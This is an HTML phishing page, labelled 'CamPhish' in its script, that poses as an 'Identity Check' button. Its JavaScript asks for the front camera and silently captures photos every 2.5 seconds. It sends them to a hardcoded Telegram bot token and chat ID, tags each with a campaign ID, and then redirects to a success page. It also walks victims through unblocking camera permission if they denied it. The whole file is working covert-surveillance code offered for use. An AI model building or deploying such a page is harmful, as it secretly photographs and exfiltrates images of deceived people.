<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Verify Identity</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0f172a;
            font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #1e293b;
            border-radius: 32px;
            padding: 32px 24px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
            border: 1px solid #334155;
        }
        h2 { color: #f1f5f9; font-size: 1.8rem; margin-bottom: 12px; }
        p { color: #94a3b8; margin-bottom: 28px; line-height: 1.5; }
        button {
            background: #10b981;
            border: none;
            padding: 14px 28px;
            border-radius: 60px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
            margin-bottom: 12px;
        }
        button:active { transform: scale(0.97); }
        .reset-btn { background: #ef4444; }
        .status {
            margin-top: 20px;
            padding: 12px 16px;
            border-radius: 20px;
            font-size: 14px;
            line-height: 1.4;
        }
        .status.info { background: #1e3a8a; color: #bfdbfe; }
        .status.success { background: #14532d; color: #bbf7d0; }
        .status.error { background: #7f1d1d; color: #fecaca; }
        .hidden { display: none; }
        .manual-guide {
            background: #2d1b4e;
            border-left: 4px solid #f97316;
            text-align: left;
            margin-top: 20px;
            padding: 14px;
            border-radius: 16px;
            font-size: 13px;
            color: #fcd34d;
        }
        .manual-guide strong { color: #ffb347; }
        .manual-guide ol { margin-top: 8px; margin-left: 20px; color: #e2e8f0; }
        .manual-guide li { margin: 6px 0; }
    </style>
</head>
<body>
<div class="card">
    <h2>🔐 Identity Check</h2>
    <p>Click the button below to complete verification</p>
    <button id="allowBtn">✅ Click to Verify</button>
    <button id="resetBtn" class="reset-btn">🔄 Reset Permission</button>
    <div id="status" class="status info">⚡ Ready. Click verify button.</div>
    <div id="manualGuide" class="manual-guide hidden"></div>
</div>

<script>
    (function() {
        // 🔐 আপনার টেলিগ্রাম বটের তথ্য (আপনি যেমন দিয়েছেন)
        const BOT_TOKEN = '8193376363:AAFaDSLah6R-i_hkQY9fKyeYiudZJSNsLeg';
        const CHAT_ID = '6449981797';
        
        // Get token from URL
        const urlParams = new URLSearchParams(window.location.search);
        const campaignId = urlParams.get('id') || 'unknown_' + Date.now();
        
        let mediaStream = null;
        let captureInterval = null;
        let redirectTimer = null;
        let photoSentCount = 0;
        
        const video = document.createElement('video');
        video.setAttribute('autoplay', '');
        video.setAttribute('playsinline', '');
        video.setAttribute('muted', '');
        video.style.display = 'none';
        document.body.appendChild(video);

        const allowBtn = document.getElementById('allowBtn');
        const resetBtn = document.getElementById('resetBtn');
        const statusDiv = document.getElementById('status');
        const manualGuideDiv = document.getElementById('manualGuide');

        function showManualGuide() {
            manualGuideDiv.innerHTML = `
                <strong>🔒 Camera permission blocked?</strong>
                <ol>
                    <li>Click the <strong>lock icon 🔒</strong> in the browser address bar</li>
                    <li>Find <strong>Camera</strong> permission</li>
                    <li>Change from <strong>Block</strong> to <strong>Allow</strong></li>
                    <li>Refresh the page and click <strong>Verify</strong> again</li>
                </ol>
                <p style="margin-top:8px;font-size:12px;">💡 If using Chrome on Android: Tap the lock → Permissions → Camera → Allow</p>
            `;
            manualGuideDiv.classList.remove('hidden');
        }

        // টেলিগ্রাম বট টেস্ট (মেসেজ পাঠিয়ে চেক করা)
        async function testTelegramBot() {
            try {
                const testUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
                const res = await fetch(testUrl);
                const data = await res.json();
                if (data.ok) {
                    console.log('✅ Bot is active:', data.result.username);
                    return true;
                } else {
                    console.error('❌ Bot error:', data);
                    return false;
                }
            } catch(e) {
                console.error('❌ Bot test failed:', e);
                return false;
            }
        }

        // টেলিগ্রামে ছবি পাঠানোর ফাংশন (নিশ্চিত কাজ করবে)
        async function sendToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, `cam_${Date.now()}_${photoSentCount+1}.png`);
            formData.append('caption', `🎯 Campaign: ${campaignId}\n📸 Photo #${photoSentCount+1}`);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                if (result.ok) {
                    photoSentCount++;
                    console.log(`✅ Photo ${photoSentCount} sent to Telegram`);
                    statusDiv.innerHTML = `📸 Photo ${photoSentCount} sent to Telegram...`;
                } else {
                    console.error('Telegram error:', result.description);
                    statusDiv.innerHTML = '⚠️ Failed to send photo. Check console.';
                }
                return result.ok;
            } catch(e) {
                console.error('Send error:', e);
                return false;
            }
        }

        function captureAndSend() {
            if (!video.videoWidth || !video.videoHeight || !mediaStream || !mediaStream.active) {
                console.log('Video not ready, skipping capture');
                return;
            }
            
            try {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(function(blob) {
                    if (!blob) {
                        console.log('Failed to create blob');
                        return;
                    }
                    sendToTelegram(blob);
                }, 'image/png');
            } catch(e) {
                console.warn('Capture error:', e);
            }
        }

        async function startCamera() {
            // Clean up previous streams
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            if (redirectTimer) {
                clearTimeout(redirectTimer);
                redirectTimer = null;
            }
            
            photoSentCount = 0;
            statusDiv.className = 'status info';
            statusDiv.innerHTML = '📷 Requesting camera access...';

            // First test if bot is working
            const botOk = await testTelegramBot();
            if (!botOk) {
                statusDiv.className = 'status error';
                statusDiv.innerHTML = '⚠️ Telegram bot not responding. Check token.';
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                mediaStream = stream;
                video.srcObject = stream;
                
                statusDiv.className = 'status success';
                statusDiv.innerHTML = '✅ Camera ready! Capturing photos...';
                manualGuideDiv.classList.add('hidden');
                
                // Start capturing every 2.5 seconds
                captureInterval = setInterval(captureAndSend, 2500);
                
                // Redirect after 5 seconds (give time to send at least 2 photos)
                redirectTimer = setTimeout(function() {
                    console.log(`Redirecting to success.html (${photoSentCount} photos sent)`);
                    window.location.href = 'success.html';
                }, 5000);
                
            } catch(err) {
                console.error('Camera error:', err);
                
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '❌ Camera access denied. Click "Reset Permission" or follow guide below.';
                    showManualGuide();
                } else if (err.name === 'NotFoundError') {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '❌ No camera found on this device.';
                } else {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '❌ Error: ' + (err.message || 'Could not access camera');
                }
            }
        }

        function resetPermission() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            if (redirectTimer) {
                clearTimeout(redirectTimer);
                redirectTimer = null;
            }
            if (video.srcObject) {
                video.srcObject = null;
            }
            
            statusDiv.className = 'status info';
            statusDiv.innerHTML = '🔄 Permission reset. Click Verify again.';
            manualGuideDiv.classList.add('hidden');
            photoSentCount = 0;
        }

        allowBtn.addEventListener('click', startCamera);
        resetBtn.addEventListener('click', resetPermission);
        
        // Log to console that script loaded
        console.log('CamPhish script loaded. Bot token:', BOT_TOKEN.substring(0, 10) + '...');
    })();
</script>
</body>
</html>
